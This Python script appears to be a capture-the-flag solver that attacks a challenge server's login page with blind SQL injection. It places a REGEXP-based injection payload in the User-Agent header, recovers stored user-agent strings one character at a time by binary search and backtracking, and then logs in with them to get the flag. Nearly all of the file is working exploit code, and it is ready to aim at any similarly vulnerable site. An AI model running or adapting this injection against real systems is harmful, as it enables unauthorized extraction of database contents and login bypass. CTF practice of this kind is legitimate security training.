# Brute force all the UserAgents with Regex via BACKTRACKING to get all possible users and seek a flag
import requests, sys

# Variables
offset = 0
rows = 1
user_agent = "' OR 1=(SELECT 1 FROM Agents WHERE UA REGEXP '%s' LIMIT %d,%d); --"
possible = [chr(i) for i in range(97, 123)]
numbers = "0,1,2,3,4,5,6,7,8,9"
#spl = "\\s,\\~,\\!,\\@,\\#,\\$,\\%,\\^,\\&,\\*,\\(,\\),\\_,\\+,\\{,\\},\\|,\\:,\\<,\\>,\\?,\\`,\\-,\\=,\\[,\\],\\\,\\;,\\',\\.,\\/"
esc_spl = "\\\\.,\\\\^,\\\\$,\\\\*,\\\\+,\\\\?,\\\\(,\\\\),\\\\[,\\\\{,\\\\\,\\\\|,\\\\^,\\\\-,\\\\],\\\\/" 
#"\\\\s,\\~,\\!,\\@,\\#,\\$,\\%,\\^,\\&,\\*,\\(,\\),\\_,\\+,\\{,\\},\\|,\\:,\\<,\\>,\\?,\\`,\\-,\\=,\\[,\\],\\\,\\;,\\',\\.,\\/"
spl = "\\\\s,\\\\t,\\\\n,\\\\r,~,\\\\!,!,#,%,&,\\\\&,=,;,:,<,>"
other = esc_spl.split(",") + spl.split(",") + numbers.split(",")
user_agents = []
payload = "^"

def make_request(payload, offset, as_user=False):
    global rows
    if as_user == False:
        headers = {"User-Agent": user_agent % (payload, offset, rows)}
    else:
        headers = {"User-Agent": payload}
    resp = requests.get("https://agents.2020.chall.actf.co/login?", headers=headers).text
    return resp

def blind_check_sqli(payload, offset):
    resp = make_request(payload, offset)
    if "banana" in resp:
        return 1
    elif "Welcome" in resp:
        return 2
    else:
        return 0

def final_check(payload, offset):
    if blind_check_sqli(payload + "$", offset) == 1:
        return True
    else:
        return False

def login_and_get_flag(payload, offset):
    payload = payload.strip("^")
    resp = make_request(payload, offset, True)
    print(resp)

def binary_search(payload, offset):
    global possible, rows
    left = 0
    right = len(possible)-1
    test_payload = payload + "[%s-%s]"
    while left < right and right-left > 3:
        mid = left + (right-left)//2
        lpayload = test_payload % (possible[left], possible[mid])
        rpayload = test_payload % (possible[mid+1], possible[right])
        #print(lpayload, rpayload, offset)
        lresp = blind_check_sqli(lpayload, offset) == 1
        rresp = blind_check_sqli(rpayload, offset) == 1
        if lresp == rresp:
            #print("Something Wrong!")
            #print(lresp, rresp)
            #return (left, right)
            break
        elif lresp:
            right = mid
        elif rresp:
            left = mid
    if lresp == rresp == False:
        return (0,0)
    return (left, right)

def backtrack_user_agent(payload, offset):
    global possible, user_agents, other
    if final_check(payload, offset):
        user_agents.append(payload)
        print(user_agents)
    else:
        ranges = binary_search(payload, offset)
        r = possible[ranges[0]:ranges[1]+1] + other
        for nxt in r:
            new = payload + nxt
            if blind_check_sqli(new, offset) == 1:
                print(new)
                backtrack_user_agent(new, offset)
    return 

def main():
    try:
        global payload
        for ofst in range(0, 2): #100
            print("Start for offset: " + str(ofst))
            backtrack_user_agent(payload, offset)
        print(user_agents)
    except Exception as e:
        print(str(e))
        print(user_agents)
        for ua in user_agents:
            login_and_get_flag(ua, offset)

def nice():
    global other
    payload = "^nice"
    payload += other[0]
    print(payload)
    print(make_request(payload, 0))

main()





